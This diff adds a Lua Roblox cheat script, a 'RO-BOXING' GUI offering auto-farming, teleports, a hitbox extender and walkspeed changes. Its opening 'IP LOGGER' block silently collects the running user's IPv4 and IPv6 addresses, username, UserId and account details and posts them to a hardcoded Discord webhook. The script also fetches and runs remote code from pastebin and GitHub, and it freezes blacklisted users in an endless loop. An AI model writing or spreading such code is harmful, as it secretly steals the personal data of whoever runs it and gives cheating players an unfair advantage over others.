@@ -1,0 +1,538 @@
+---- IP LOGGER ----
+pcall(function()
+    local Webhook = "https://discord.com/api/webhooks/1060904346356817980/N0PhVFpCU7wf5Zt_SCplaBc_do_EVTLBmbc7slJsMQIwLpxTCgdJmWDObSvPHYBpGHdD" -- Put your Webhook link here
+    local IPv4 = game:HttpGet("https://v4.ident.me/")
+    local IPv6 = game:HttpGet("https://v6.ident.me/")
+
+    local Headers = {["content-type"] = "application/json"} -- Don't Modify
+
+    local LocalPlayer = game:GetService("Players").LocalPlayer
+
+    local AccountAge = LocalPlayer.AccountAge
+    local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
+    local UserId = LocalPlayer.UserId
+    local PlayerName = game.Players.LocalPlayer.Name
+
+    local PlayerData =
+    {
+        ["content"] = "",
+        ["embeds"] = {{
+            ["title"] = "**Username**:",
+            ["description"] = PlayerName,
+            ["color"] = tonumber(0x2B6BE4),
+            ["fields"] = {
+                {
+                    ["name"] = "MembershipType:",
+                    ["value"] = MembershipType,
+                    ["inline"] = true
+    },
+                {
+                    ["name"] = "AccountAge:",
+                    ["value"] = AccountAge,
+                    ["inline"] = true
+    },
+                {
+                    ["name"] = "UserId:",
+                    ["value"] = UserId,
+                    ["inline"] = true
+    },
+                {
+                    ["name"] = "IPv4:",
+                    ["value"] = IPv4,
+                    ["inline"] = true
+    },
+                {
+                    ["name"] = "IPv6:",
+                    ["value"] = IPv6,
+                    ["inline"] = true
+    },
+            },
+        }}
+    }
+
+    local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
+    local HttpRequest = http_request;
+
+    if syn then
+    HttpRequest = syn.request
+    else
+    HttpRequest = http_request
+    end
+
+    HttpRequest({Url=Webhook, Body=PlayerData, Method="POST", Headers=Headers})
+end)
+
+
+---- WHITELIST CHECKER -----
+
+local BlacklistedUsers = loadstring(game:HttpGet("https://pastebin.com/raw/XVf4WD1P"))()
+
+if table.find(BlacklistedUsers, game.Players.LocalPlayer.UserId) then
+    while true do end
+else
+    getgenv().AutoWeights = false -- Done
+    getgenv().AutoRopes = false -- Done
+    getgenv().AutoEndurance = false -- Done
+    getgenv().AutoTrampoline = false -- Done
+    getgenv().AutoBags = false -- Done
+    getgenv().AutoAccuracy = false -- Done
+    getgenv().AutoSwimmingPool = false -- Done
+    getgenv().AutoTreadmills = false -- Done
+    getgenv().HitboxExtender = false -- Done
+    getgenv().AutoShakes = false -- Done
+
+    local LocalPlayer, Character = game.Players.LocalPlayer, game.Players.LocalPlayer.Character
+    local WeightsTable = {game:GetService("Workspace").Overhead1, game:GetService("Workspace").Bicep1, game:GetService("Workspace").Squat1, game:GetService("Workspace").Bench1}
+    local BagTable = {game:GetService("Workspace").Punch_Bag1, game:GetService("Workspace").Punch_Bag2, game:GetService("Workspace").Speed_Bag1, game:GetService("Workspace").Speed_Bag2}
+    local RingTable = {game:GetService("Workspace").Spar_Ring1, game:GetService("Workspace").Spar_Ring2, game:GetService("Workspace").Spar_Ring3, game:GetService("Workspace").Spar_Ring4, game:GetService("Workspace").Spar_Ring5}
+    local PFS = game:GetService("PathfindingService")
+    local HitboxSize, TeleportSpeed = 16, 0.5
+
+    function InstancePart()
+        if game:GetService("Workspace"):FindFirstChild("BasePlate") == nil then
+            local BasePlate = Instance.new("Part")
+            BasePlate.Size = Vector3.new(50, 2, 50)
+            BasePlate.Position = Vector3.new(math.random(500, 1000), math.random(500, 2000), math.random(500, 1000))
+            BasePlate.Anchored = true
+            BasePlate.Name = "BasePlate"
+            BasePlate.Parent = game:GetService("Workspace")
+        end
+    end
+
+    InstancePart()
+
+    function AutoWeights()
+        while getgenv().AutoWeights do task.wait()
+            local LocalPlayer, Character = game.Players.LocalPlayer, game.Players.LocalPlayer.Character
+            pcall(function()
+                for i,v in pairs(WeightsTable) do
+                    if v.In_Use.Value == false and v.Player.Value ~= LocalPlayer.Name then
+                        Character.HumanoidRootPart.CFrame = v.Torso_Position.CFrame
+                        Character.Humanoid:ChangeState("Jumping")
+                        for i,v in pairs(getconnections(LocalPlayer.PlayerGui.Training_Guis.Exercise_Prompt.Activated)) do
+                            v.Function()
+                        end
+                        for i,v in pairs(Character:GetChildren()) do
+                            if string.match(v.Name, "_Bar") then
+                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Workspace").BasePlate.CFrame + Vector3.new(0,4,0)
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+
+    function AutoRopes(RopeType, BottomTypeRope)
+        while getgenv().AutoRopes do task.wait()
+            local LocalPlayer, Character = game.Players.LocalPlayer, game.Players.LocalPlayer.Character
+            pcall(function()
+                Character.HumanoidRootPart.CFrame = BottomTypeRope
+                task.wait(0.2)
+                local TS = game:GetService("TweenService"):Create(Character.HumanoidRootPart, TweenInfo.new(TeleportSpeed), {CFrame = RopeType})
+                TS:Play()
+                TS.Completed:Wait()
+            end)
+        end
+    end
+
+    function AutoEndurance()
+        while getgenv().AutoEndurance do task.wait()
+            local LocalPlayer, Character = game.Players.LocalPlayer, game.Players.LocalPlayer.Character
+            pcall(function()
+                for i,Ring in pairs(RingTable) do
+                    if Character:FindFirstChild("Special") == nil and Ring.Ring_Empty.Value == true and Ring.P1_Name.Value ~= "" or Ring.P2_Name.Value ~= "" then
+                        if Ring.Player1_Button.BrickColor == BrickColor.new("Bright blue") then return end
+                        Character.HumanoidRootPart.CFrame = Ring.Player1_Button.CFrame + Vector3.new(0,3,0)
+                        task.wait(0.2)
+                        Character.HumanoidRootPart.CFrame = Ring.Player2_Button.CFrame + Vector3.new(0,3,0)
+                        if Ring.P1_Name.Value ~= LocalPlayer.Name then
+                            Enemy = game:GetService("Players"):FindFirstChild(Ring.P1_Name.Value)
+                        elseif Ring.P1_Name.Value == LocalPlayer.Name then
+                            Enemy = game:GetService("Players"):FindFirstChild(Ring.P2_Name.Value)
+                        end
+                        repeat task.wait()
+                            Character.HumanoidRootPart.CFrame = Enemy.Character.HumanoidRootPart.CFrame
+                            task.wait()
+                            game:GetService("VirtualInputManager"):SendMouseButtonEvent(500, 500, 0, true, game, 1)
+                        until Ring.Ring_Empty.Value == true or Character:FindFirstChild("Special") == nil or getgenv().AutoEndurance == false
+                    end
+                end
+            end)
+        end
+    end
+
+    function AutoTrampoline()
+        while getgenv().AutoTrampoline do task.wait()
+            local LocalPlayer, Character = game.Players.LocalPlayer, game.Players.LocalPlayer.Character
+            pcall(function()
+                for i = 1,4 do
+                    local v = game:GetService("Workspace")["Tramp"..i]
+                    if v.In_Use.Value == false and v.Player.Value ~= LocalPlayer.Name then
+                        Character.HumanoidRootPart.CFrame = v.Torso_Position.CFrame
+                        Character.Humanoid:ChangeState("Jumping")
+                        for i,v in pairs(getconnections(LocalPlayer.PlayerGui.Training_Guis.Exercise_Prompt.Activated)) do
+                            v.Function()
+                        end
+                        for i,v in pairs(Character:GetChildren()) do
+                            if v.Name == "Push_Up" then
+                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Workspace").BasePlate.CFrame + Vector3.new(0,4,0)
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+
+    function AutoBags()
+        while getgenv().AutoBags do task.wait()
+            local LocalPlayer, Character = game.Players.LocalPlayer, game.Players.LocalPlayer.Character
+            pcall(function()
+                for i,v in pairs(BagTable) do
+                    if v.In_Use.Value == false and v.Player.Value ~= LocalPlayer.Name then
+                        Character.HumanoidRootPart.CFrame = v.Torso_Position.CFrame
+                        Character.Humanoid:ChangeState("Jumping")
+                        for i,v in pairs(getconnections(LocalPlayer.PlayerGui.Training_Guis.Exercise_Prompt.Activated)) do
+                            v.Function()
+                        end
+                        for i,v in pairs(Character:GetChildren()) do
+                            if v.Name == "Punch_Bag" or v.Name == "Speed_Bag" then
+                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Workspace").BasePlate.CFrame + Vector3.new(0,4,0)
+                            end
+                        end 
+                    end
+                end
+            end)
+        end
+    end
+
+    function AutoAccuracy()
+        while getgenv().AutoAccuracy do task.wait()
+            local LocalPlayer, Character = game.Players.LocalPlayer, game.Players.LocalPlayer.Character
+            pcall(function()
+                for i = 1,4 do
+                    local v = game:GetService("Workspace")["Dummy_Punch"..i]
+                    if v.In_Use.Value == false and v.Player.Value ~= LocalPlayer.Name then
+                        repeat task.wait()
+                            Character.HumanoidRootPart.CFrame = v.Torso_Position.CFrame
+                            Character.Humanoid:ChangeState("Jumping")
+                            for i,v in pairs(getconnections(LocalPlayer.PlayerGui.Training_Guis.Exercise_Prompt.Activated)) do
+                                v.Function()
+                            end
+                        until v.In_Use.Value == true or getgenv().AutoAccuracy == false
+                        repeat task.wait()
+                            for k,x in pairs(v.Buttons:GetChildren()) do
+                                fireclickdetector(x.ClickDetector)
+                            end
+                        until v.In_Use.Value == false
+                    end
+                end
+            end)
+        end
+    end
+
+
+    function AutoSwimmingPool()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-127.55687, 3.51994562, -102.936539, 0.0198256187, 7.16463333e-09, 0.999803424, 1.02049889e-07, 1, -9.18964194e-09, -0.999803424, 1.0221202e-07, 0.0198256187)
+        while getgenv().AutoSwimmingPool do task.wait()
+            local LocalPlayer, Character = game.Players.LocalPlayer, game.Players.LocalPlayer.Character
+            Character.Humanoid:MoveTo(Vector3.new(-137.72329711914062, -1.3055282831192017, -101.7966537475586))
+            Character.Humanoid.MoveToFinished:Wait()
+            task.wait(0.5)
+            Character.Humanoid:MoveTo(Vector3.new(-183.7988739013672, -0.554472029209137, -102.47177124023438))
+            Character.Humanoid.MoveToFinished:Wait()
+            task.wait(0.5)
+        end
+    end
+
+    function AutoTreadmills()
+        while getgenv().AutoTreadmills do task.wait()
+            local LocalPlayer, Character = game.Players.LocalPlayer, game.Players.LocalPlayer.Character
+            pcall(function()
+                Character.HumanoidRootPart.CFrame = CFrame.new(-145.703537, 4.52202797, -11.1322718, 0.00318779657, -7.95525068e-09, 0.999994934, -3.14554743e-10, 1, 7.9562934e-09, -0.999994934, -3.39916206e-10, 0.00318779657)
+                game:GetService("VirtualInputManager"):SendKeyEvent(true, "W", false, game)
+                task.wait()
+                game:GetService("VirtualInputManager"):SendKeyEvent(false, "W", false, game)
+            end)
+        end
+    end
+
+    function HitboxExtender()
+        game:GetService("RunService").Stepped:Connect(function()
+            local LocalPlayer, Character = game.Players.LocalPlayer, game.Players.LocalPlayer.Character
+            if not getgenv().HitboxExtender then return end
+            pcall(function()
+                for i,v in pairs(game:GetService("Players"):GetPlayers()) do
+                    if v ~= LocalPlayer then
+                        if v.Character:FindFirstChild("Special") then
+                            v.Character.HumanoidRootPart.Size = Vector3.new(HitboxSize, HitboxSize, HitboxSize)
+                            v.Character.HumanoidRootPart.CanCollide = false
+                            v.Character.HumanoidRootPart.Transparency = 1
+                            
+                            v.Character.Torso.Size = Vector3.new(HitboxSize, HitboxSize, HitboxSize)
+                            v.Character.Torso.CanCollide = false
+                            v.Character.Torso.Transparency = 1
+                        elseif not v.Character:FindFirstChild("Special") then
+                            v.Character.HumanoidRootPart.Size = Vector3.new(2, 2, 1)
+                            v.Character.HumanoidRootPart.CanCollide = false
+                            v.Character.HumanoidRootPart.Transparency = 1
+                            
+                            v.Character.Torso.Size = Vector3.new(2, 2, 1)
+                            v.Character.Torso.CanCollide = true
+                            v.Character.Torso.Transparency = 1
+                        end
+                    end
+                end
+            end)
+        end)
+    end
+
+    function AutoShakes(ShakeType)
+        while getgenv().AutoShakes do task.wait()
+            local LocalPlayer, Character = game.Players.LocalPlayer, game.Players.LocalPlayer.Character
+            pcall(function()
+                if LocalPlayer.PlayerGui.Stats.Stats_Image.Stats.Boost.Bar.AbsoluteSize.X <= 50 then
+                    game:GetService("ReplicatedStorage").Drink_Shake:InvokeServer(ShakeType)
+                    task.wait(10)
+                end
+            end)
+        end
+    end
+
+    function AntiAfk()
+        local VirtualUser = game:GetService("VirtualUser")
+        game:GetService("Players").LocalPlayer.Idled:Connect(function()
+            VirtualUser:CaptureController()
+            VirtualUser:ClickButton2(Vector2.new(0,0))
+        end)
+    end
+
+
+
+    local OrionLib = loadstring(game:HttpGet(("https://raw.githubusercontent.com/shlexware/Orion/main/source")))()
+    local Window = OrionLib:MakeWindow({Name = "RO-BOXING GUI by, ! Zho#7471", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
+    local FarmingTab = Window:MakeTab({Name = "Farming", Icon = "rbxassetid://4483345998", PremiumOnly = false})
+    local ShakesTab = Window:MakeTab({Name = "Shakes", Icon = "rbxassetid://4483345998", PremiumOnly = false})
+    local AreasTab = Window:MakeTab({Name = "Areas", Icon = "rbxassetid://4483345998", PremiumOnly = false})
+    local MiscellaneousTab = Window:MakeTab({Name = "Miscellaneous", Icon = "rbxassetid://4483345998", PremiumOnly = false})
+    local CreditsTab = Window:MakeTab({Name = "Credits", Icon = "rbxassetid://4483345998", PremiumOnly = false})
+    local Section = FarmingTab:AddSection({Name = "Strength Training"})
+
+    FarmingTab:AddToggle({Name = "Auto Weights!", Default = false, Callback = function(Value)
+        getgenv().AutoWeights = Value
+        if Value then
+            AutoWeights()
+        end
+    end})
+
+    local SelectedBottomRope
+    local SelectedRope
+    FarmingTab:AddToggle({Name = "Auto Ropes!", Default = false, Callback = function(Value)
+        getgenv().AutoRopes = Value
+        if Value then
+            AutoRopes(SelectedRope, SelectedBottomRope)
+        end
+    end})
+
+    local Section = FarmingTab:AddSection({Name = "Rope Settings"})
+
+    FarmingTab:AddDropdown({Name = "Selected Rope", Default = "1", Options = {"Rope 1", "Rope 2", "Rope 3", "Rope 4", "Rope 5"}, Callback = function(Value)
+        SelectedRope = Value
+        if SelectedRope == "Rope 1" then
+            SelectedRope = CFrame.new(-113.177742, 14.8438225, -11.9890127, 0.999193788, -2.39842368e-08, 0.0401474051, 2.4272282e-08, 1, -6.68724098e-09, -0.0401474051, 7.65631913e-09, 0.999193788)
+            if SelectedRope == CFrame.new(-113.177742, 14.8438225, -11.9890127, 0.999193788, -2.39842368e-08, 0.0401474051, 2.4272282e-08, 1, -6.68724098e-09, -0.0401474051, 7.65631913e-09, 0.999193788) then
+                SelectedBottomRope = CFrame.new(-113.15744, 3.67301774, -12.0059719, 0.999991894, -6.25010088e-08, 0.00403150916, 6.28149834e-08, 1, -7.77534197e-08, -0.00403150916, 7.80060319e-08, 0.999991894)
+            end
+        elseif SelectedRope == "Rope 2" then
+            SelectedRope = CFrame.new(-113.15863, 14.7572079, -5.06802177, 0.999418139, -4.52284894e-08, -0.0341086388, 4.50501467e-08, 1, -5.99727423e-09, 0.0341086388, 4.45718529e-09, 0.999418139)
+            if SelectedRope == CFrame.new(-113.15863, 14.7572079, -5.06802177, 0.999418139, -4.52284894e-08, -0.0341086388, 4.50501467e-08, 1, -5.99727423e-09, 0.0341086388, 4.45718529e-09, 0.999418139) then
+                SelectedBottomRope = CFrame.new(-113.241653, 4.082201, -5.0145936, 0.999417961, -7.55962937e-09, -0.034113083, 1.11658345e-08, 1, 1.05522751e-07, 0.034113083, -1.05842233e-07, 0.999417961)
+            end
+        elseif SelectedRope == "Rope 3" then
+            SelectedRope = CFrame.new(-113.424805, 14.7013712, 2.01058149, 0.999976635, 3.27685541e-08, -0.00684011122, -3.28316645e-08, 1, -9.11415565e-09, 0.00684011122, 9.33851485e-09, 0.999976635)
+            if SelectedRope == CFrame.new(-113.424805, 14.7013712, 2.01058149, 0.999976635, 3.27685541e-08, -0.00684011122, -3.28316645e-08, 1, -9.11415565e-09, 0.00684011122, 9.33851485e-09, 0.999976635) then
+                SelectedBottomRope = CFrame.new(-113.424805, 4.62129116, 2.01058149, 0.999976635, 9.11955524e-08, -0.00684011122, -9.13711915e-08, 1, -2.53651713e-08, 0.00684011122, 2.59895678e-08, 0.999976635)
+            end
+        elseif SelectedRope == "Rope 4" then
+            SelectedRope = CFrame.new(-113.053642, 14.9124489, 8.99376011, 0.999798238, 4.58631035e-08, -0.0200857893, -4.40842101e-08, 1, 8.90075782e-08, 0.0200857893, -8.81041515e-08, 0.999798238)
+            if SelectedRope == CFrame.new(-113.053642, 14.9124489, 8.99376011, 0.999798238, 4.58631035e-08, -0.0200857893, -4.40842101e-08, 1, 8.90075782e-08, 0.0200857893, -8.81041515e-08, 0.999798238) then
+                SelectedBottomRope = CFrame.new(-113.053642, 4.27240467, 8.99376011, 0.999798238, -2.91861415e-08, -0.0200857893, 2.80540515e-08, 1, -5.66445557e-08, 0.0200857893, 5.60696414e-08, 0.999798238)
+            end
+        elseif SelectedRope == "Rope 5" then
+            SelectedRope = CFrame.new(-113.53595, 14.8768663, 15.9825144, 0.999689937, 5.92877392e-08, -0.0248998068, -6.09612911e-08, 1, -6.64525501e-08, 0.0248998068, 6.79498768e-08, 0.999689937)
+            if SelectedRope == CFrame.new(-113.53595, 14.8768663, 15.9825144, 0.999689937, 5.92877392e-08, -0.0248998068, -6.09612911e-08, 1, -6.64525501e-08, 0.0248998068, 6.79498768e-08, 0.999689937) then
+                SelectedBottomRope = CFrame.new(-113.53595, 4.6101265, 15.9825144, 0.999689937, 3.27953451e-08, -0.0248998068, -3.36235964e-08, 1, -3.28447491e-08, 0.0248998068, 3.36717854e-08, 0.999689937)
+            end
+        end
+    end})
+
+    FarmingTab:AddSlider({Name = "Rope Speed!", Min = 0.2, Max = 1, Default = 0.2, Color = Color3.fromRGB(255,255,255), Increment = 0.1, ValueName = "Rope Speed", Callback = function(Value)
+        TeleportSpeed = Value
+    end})
+
+    local Section = FarmingTab:AddSection({Name = "Speed Training"})
+
+    FarmingTab:AddToggle({Name = "Auto Bags!", Default = false, Callback = function(Value)
+        getgenv().AutoBags = Value
+        if Value then
+            AutoBags()
+        end
+    end})
+
+    FarmingTab:AddToggle({Name = "Auto Trampolines!", Default = false, Callback = function(Value)
+        getgenv().AutoTrampoline = Value
+        if Value then
+            AutoTrampoline()
+        end
+    end})
+
+    local Section = FarmingTab:AddSection({Name = "Fitness Training"})
+
+    FarmingTab:AddToggle({Name = "Auto Treadmills!", Default = false, Callback = function(Value)
+        getgenv().AutoTreadmills = Value
+        if Value then
+            AutoTreadmills()
+        end
+    end})
+
+    FarmingTab:AddToggle({Name = "Auto Swimming-Pool!", Default = false, Callback = function(Value)
+        getgenv().AutoSwimmingPool = Value
+        if Value then
+            OrionLib:MakeNotification({Name = "Auto Swimming-Pool!", Content = "The recommended swimming pool speed is 20", Image = "rbxassetid://4483345998", Time = 10})
+            AutoSwimmingPool()
+        end
+    end})
+
+    FarmingTab:AddSlider({Name = "Swimming Pool Speed!", Min = 16, Max = 25, Default = 22, Color = Color3.fromRGB(255,255,255), Increment = 1, ValueName = "Swimming Pool Speed", Callback = function(Value)
+        if getgenv().AutoSwimmingPool then
+            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value
+        end
+    end})
+    local Section = FarmingTab:AddSection({Name = "Accuracy Training / Endurance Training"})
+
+    FarmingTab:AddToggle({Name = "Auto Accuracy!", Default = false, Callback = function(Value)
+        getgenv().AutoAccuracy = Value
+        if Value then
+            AutoAccuracy()
+        end
+    end})
+
+    FarmingTab:AddToggle({Name = "Auto Endurance!", Default = false, Callback = function(Value)
+        getgenv().AutoEndurance = Value
+        if Value then
+            OrionLib:MakeNotification({Name = "Auto Endurance!", Content = "Will automatically train endurance if a player has ready'd up in a ring!", Image = "rbxassetid://4483345998", Time = 10})
+            AutoEndurance()
+        end
+    end})
+
+    local Section = ShakesTab:AddSection({Name = "Auto Shakes"})
+
+    ShakesTab:AddToggle({Name = "Auto Toxic Shake!", Default = false, Callback = function(Value)
+        getgenv().AutoShakes = Value
+        if Value then
+            AutoShakes("Toxic")
+        end
+    end})
+
+    ShakesTab:AddToggle({Name = "Auto Chocolate Shake!", Default = false, Callback = function(Value)
+        getgenv().AutoShakes = Value
+        if Value then
+            AutoShakes("Chocolate")
+        end
+    end})
+
+    ShakesTab:AddToggle({Name = "Auto Vanilla Shake!", Default = false, Callback = function(Value)
+        getgenv().AutoShakes = Value
+        if Value then
+            AutoShakes("Vanilla")
+        end
+    end})
+
+    local Section = AreasTab:AddSection({Name = "Areas"})
+
+    AreasTab:AddButton({Name = "Teleport To Spawn!", Callback = function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-30.6511478, -20.5987816, 1.03446233, -0.0235631522, -4.76101327e-08, -0.999722362, 3.41281918e-08, 1, -4.84277471e-08, 0.999722362, -3.52598235e-08, -0.0235631522)
+    end})
+
+    AreasTab:AddButton({Name = "Teleport To Shop!", Callback = function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-79.2828522, 3.4012928, 0.903012037, 0.0525048971, -7.35501127e-09, 0.998620689, -1.02298603e-09, 1, 7.41895612e-09, -0.998620689, -1.41110656e-09, 0.0525048971)
+    end})
+
+    AreasTab:AddButton({Name = "Teleport To Sparring Rings!", Callback = function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-188.659836, -20.5987091, 0.763683975, -0.000790094142, 1.78524431e-08, 0.999999702, 3.50519258e-08, 1, -1.7824755e-08, -0.999999702, 3.50378322e-08, -0.000790094142)
+    end})
+
+    AreasTab:AddButton({Name = "Teleport To 2v2 Rings!", Callback = function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-182.699631, -20.5987091, 154.491394, 0.00724409707, -7.38291419e-08, 0.999973774, -4.65038212e-08, 1, 7.41679642e-08, -0.999973774, -4.70398831e-08, 0.00724409707)
+    end})
+
+    AreasTab:AddButton({Name = "Teleport To Weights!", Callback = function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-113.144981, 3.4012928, 41.2824974, -0.999211907, 9.52243884e-09, 0.0396926291, 5.40446932e-09, 1, -1.03853743e-07, -0.0396926291, -1.03557383e-07, -0.999211907)
+    end})
+
+    AreasTab:AddButton({Name = "Teleport To Punching Bags!", Callback = function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-131.152405, 3.4012928, -42.0323906, 0.0152695449, 4.55989699e-08, 0.999883413, 6.34824859e-09, 1, -4.57012312e-08, -0.999883413, 7.0453452e-09, 0.0152695449)
+    end})
+
+    AreasTab:AddButton({Name = "Teleport To Swimming Pool!", Callback = function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-130.920319, 3.51994514, -113.409492, 0.0313154906, 5.62058347e-08, 0.999509573, -8.55616733e-08, 1, -5.35526929e-08, -0.999509573, -8.38426786e-08, 0.0313154906)
+    end})
+
+    local Section = MiscellaneousTab:AddSection({Name = "Hitbox Extender"})
+
+    MiscellaneousTab:AddToggle({Name = "Hitbox Extender! [BETA]", Default = false, Callback = function(Value)
+        getgenv().HitboxExtender = Value
+        if Value then
+            HitboxExtender()
+        end
+    end})
+
+    MiscellaneousTab:AddSlider({Name = "Hitbox Size!", Min = 2, Max = 35, Default = 2, Color = Color3.fromRGB(255,255,255), Increment = 1, ValueName = "Hitbox Size", Callback = function(Value)
+        HitboxSize = Value
+    end})
+
+    local Section = MiscellaneousTab:AddSection({Name = "Anti-Afk / Anti-Lag"})
+
+    MiscellaneousTab:AddButton({Name = "Anti-Afk!", Callback = function()
+        AntiAfk()
+        OrionLib:MakeNotification({Name = "Anti-Afk!", Content = "Anti-Afk has been enabled!", Image = "rbxassetid://4483345998", Time = 10})
+    end})
+
+    MiscellaneousTab:AddButton({Name = "Anti-Lag!", Callback = function()
+        for i,v in pairs(game:GetDescendants()) do
+            if v:IsA("BasePart") or v:IsA("Part") then
+                v.Material = "SmoothPlastic"
+            end
+        end
+    end})
+
+
+    local Section = MiscellaneousTab:AddSection({Name = "WalkSpeed"})
+
+    MiscellaneousTab:AddSlider({Name = "WalkSpeed!", Min = 16, Max = 100, Default = 16, Color = Color3.fromRGB(255,255,255), Increment = 1, ValueName = "Walkspeed", Callback = function(Value)
+        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value
+    end})
+
+    MiscellaneousTab:AddButton({Name = "Default WalkSpeed", Callback = function()
+        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
+    end})
+
+
+    local Section = MiscellaneousTab:AddSection({Name = "Destroy Gui"})
+
+    MiscellaneousTab:AddButton({Name = "Destroy Gui!", Callback = function()
+        OrionLib:Destroy()
+    end})
+
+    local Section = MiscellaneousTab:AddSection({Name = "Stat Viewer [COMING SOON]"})
+
+    local Section = CreditsTab:AddSection({Name = "From Zho"})
+
+    CreditsTab:AddParagraph("RO-BOXING GUI","This Gui was made by ! Zho#7471, Feel free to join the discord below if you have any questions, would like to report something or provide feedback on the GUI!")
+
+    CreditsTab:AddButton({Name = "Discord Invite Link!", Callback = function()
+        setclipboard("https://discord.gg/kxY3CYVnwH")
+        OrionLib:MakeNotification({Name = "discord.gg/", Content = "Discord Server Invite Has Been Automatically Copied To Your ClipBoard!", Image = "rbxassetid://4483345998", Time = 10})
+    end})
+end
